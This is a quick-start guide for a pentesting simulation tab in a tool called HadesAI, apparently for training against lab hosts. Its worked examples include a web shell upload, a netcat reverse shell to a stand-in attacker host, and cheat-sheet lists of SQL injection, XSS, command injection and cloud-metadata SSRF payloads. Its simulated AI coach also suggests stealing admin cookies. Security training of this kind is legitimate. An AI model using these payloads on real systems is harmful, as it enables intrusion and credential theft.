# Simulations Tab - Quick Start Guide

## Launch Simulations

1. Open **HadesAI**
2. Click the **🎯 Simulations** tab
3. Select a scenario from the list

---

## What You'll See

```
┌─────────────────────────────────────────────────┐
│ 📋 Scenario Selection                           │
│ ├─ 🔓 E-Commerce Login Bypass      [Easy]       │
│ ├─ 🕸️  Reflected XSS in Search     [Easy]       │
│ ├─ 💉 Admin Panel RCE              [Medium]     │
│ ├─ 🎭 AWS Metadata SSRF            [Medium]     │
│ └─ ... and more                                 │
├─────────────────────────────────────────────────┤
│ 🖥️ Penetration Testing Console                 │
│ $ Enter your pentesting command here...         │
├─────────────────────────────────────────────────┤
│ 🤖 AI Coaching & Analysis                       │
│ [Real-time feedback and suggestions]            │
└─────────────────────────────────────────────────┘
```

---

## Quick Examples

### Example 1: SQL Injection in Login

**Scenario**: E-Commerce Login Bypass

```bash
# Step 1: Reconnaissance
$ curl http://shop.vuln.local/login.php

# Response: Form with username/password fields
HTTP/1.1 200 OK
<form method="POST" action="/login.php">
<input name="username">
<input name="password" type="password">
</form>

# Step 2: SQL Injection Test
$ sqlmap -u "http://shop.vuln.local/login.php" --forms

# Response: Found SQL injection vulnerability!
Extracted users: admin, user1, user2
Passwords: 5f4dcc3b5aa765d61d8327deb882cf99

# AI Coaching: "Excellent! You found admin credentials. 
Next, crack the password hash and login."
```

---

### Example 2: XSS Attack

**Scenario**: Reflected XSS in Search

```bash
# Step 1: Test Reflection
$ curl "http://blog.vuln.local/search.php?q=test"

# Response: <p>You searched for: test</p>
# Unescaped! Vulnerable to XSS.

# Step 2: Inject Payload
$ <script>alert('xss')</script>

# Response: XSS Payload Executed!
Payload reflected in response without sanitization

# AI Coaching: "Perfect XSS confirmation! Now craft 
a payload to steal admin session cookies."
```

---

### Example 3: Remote Code Execution

**Scenario**: Admin Panel RCE

```bash
# Step 1: File Upload
$ curl -F "file=@shell.php" http://admin.vuln.local/upload.php

# Response: File upload successful.
Shell uploaded to /uploads/shell.php

# Step 2: Command Execution
$ id

# Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Step 3: Establish Reverse Shell
$ nc -e /bin/bash attacker.com 4444

# Response: Reverse shell established
You now have interactive shell access!
```

---

## Command Reference

### Essential Commands

```bash
# Reconnaissance
curl http://target
nmap -sV target
whatweb target

# SQL Injection
sqlmap -u "http://target/page?id=1"
' OR '1'='1
' UNION SELECT table_name FROM information_schema.tables--

# XSS
<script>alert('xss')</script>
<img src=x onerror="alert('xss')">

# Command Injection
; id
| whoami
$(whoami)

# SSRF
http://localhost:8080
http://169.254.169.254
http://internal-service

# Privilege Escalation
sudo -l
find / -perm -4000
getcap -r /
```

---

## Difficulty Levels Explained

### 🟢 Easy
- Single vulnerability to exploit
- Clear exploitation path
- Realistic but straightforward
- **Time**: 5-15 minutes per scenario

### 🟡 Medium
- Multiple steps required
- Requires technique chaining
- Real-world complexity
- **Time**: 15-30 minutes per scenario

### 🔴 Hard
- Complex attack chains
- Multiple systems involved
- Requires system understanding
- **Time**: 30+ minutes per scenario

---

## Starting Tips

### For Beginners
```
1. Start with "E-Commerce Login Bypass"
2. Try simple reconnaissance first (curl)
3. Follow AI coaching suggestions
4. Take notes of what works
5. Move to next easy scenario
```

### For Intermediate
```
1. Start with "Admin Panel RCE"
2. Chain file upload + command execution
3. Establish reverse shells
4. Practice on multiple scenarios
```

### For Advanced
```
1. Jump to "Multi-Vulnerability App"
2. Chain multiple exploits
3. Practice network pivoting
4. Focus on speed and efficiency
```

---

## Reading AI Feedback

### Good Sign ✅
> "Great! You've identified the vulnerability correctly. Next, try to exploit it..."

**What to do**: You're on the right track. Continue with exploitation.

### Needs Adjustment ⚠️
> "You've found a potential vector, but this approach might not work. Try a different technique..."

**What to do**: Pivot to alternative exploitation method.

### Progress Achieved 🎯
> "Excellent work! You've completed an objective. Now move to the next phase..."

**What to do**: Continue to next objective in the scenario.

---

## Common Payloads Quick List

### SQL Injection Quick Wins
```sql
' OR '1'='1
admin'--
' UNION SELECT username, password FROM users--
1' AND 1=1--
```

### XSS Quick Wins
```html
<script>alert('xss')</script>
<img src=x onerror=alert('xss')>
<svg onload=alert('xss')>
javascript:alert('xss')
```

### Command Injection Quick Wins
```bash
; whoami
| id
`whoami`
$(whoami)
```

---

## Pro Tips

### 🚀 Speed Up Learning
1. **Read briefing carefully** - Understand the target
2. **Follow suggested techniques** - AI knows what works
3. **Document findings** - Build a knowledge base
4. **Review completed scenarios** - Reinforce learning
5. **Attempt harder difficulty** - Challenge yourself

### 🎯 Real-World Application
- These exact techniques work on real targets
- Tools mentioned are real pentesting tools
- Responses simulate real server behavior
- Methodology mirrors actual assessments
- Findings documentation practices are industry standard

### 📚 Learn More
- Click on each scenario for detailed guide
- Read REALISTIC_SIMULATIONS_GUIDE.md for comprehensive help
- Ask questions in main AI chat
- Review failed attempts for learning

---

## Scenario Quick Summary

| Scenario | Difficulty | Focus | Time |
|----------|-----------|-------|------|
| E-Commerce Login | Easy | SQL Injection | 10 min |
| Reflected XSS | Easy | JavaScript Injection | 10 min |
| Admin RCE | Medium | File Upload + Execution | 20 min |
| AWS Metadata SSRF | Medium | SSRF + Credential Theft | 20 min |
| JWT Bypass | Medium | Token Forgery | 15 min |
| Multi-Vuln App | Hard | Exploit Chaining | 30 min |
| Network Pivoting | Hard | Lateral Movement | 40 min |
| Privilege Escalation | Hard | Privesc Techniques | 25 min |

---

## Getting Help

### If You're Stuck
1. **Read AI coaching** - It provides specific guidance
2. **Try different payloads** - Variations often work
3. **Use reconnaissance** - Understanding helps exploitation
4. **Review examples** - See what worked before
5. **Ask in main chat** - Get additional guidance

### Common Issues
```
"Nothing happens with my payload"
→ Try different variations, read error messages

"I don't know what to do next"
→ Check AI coaching feedback, read scenario briefing

"Commands aren't executing"
→ Ensure command syntax is correct, try simpler tests

"Don't understand the vulnerability"
→ Ask main AI chat, read the guide, research the CWE
```

---

## Progress Tracking

Your progress is tracked across:
- ✅ Completed scenarios (marked on tab)
- 📊 Techniques learned (shared with main AI)
- 🎓 Knowledge gained (applies to future work)
- 📈 Improvement suggestions (personalized coaching)

---

## Practice Goals

### Session 1 (Today)
- [ ] Complete 1-2 Easy scenarios
- [ ] Understand basic exploitation
- [ ] Get comfortable with UI

### Session 2 (Tomorrow)
- [ ] Finish all Easy scenarios
- [ ] Start first Medium scenario
- [ ] Practice command syntax

### Session 3+ (This Week)
- [ ] Complete all Medium scenarios
- [ ] Attempt Hard scenarios
- [ ] Chain exploits together
- [ ] Apply to real assessments

---

## Ready to Start? 🚀

1. **Open HadesAI**
2. **Go to 🎯 Simulations tab**
3. **Select "E-Commerce Login Bypass"**
4. **Type**: `curl http://shop.vuln.local/login.php`
5. **Press Enter**
6. **Follow the AI coaching**

---

## Key Takeaway

**These simulations teach you to think like a pentester:**
- Systematic reconnaissance
- Logical vulnerability identification
- Practical exploitation techniques
- Real-world tool usage
- Professional documentation

**Start practicing now and become proficient in actual penetration testing! 💻🔒**

---

**Questions?** → Ask in main 💬 AI Chat tab
**Need detail?** → Read REALISTIC_SIMULATIONS_GUIDE.md
**Ready?** → Let's begin! 🎯
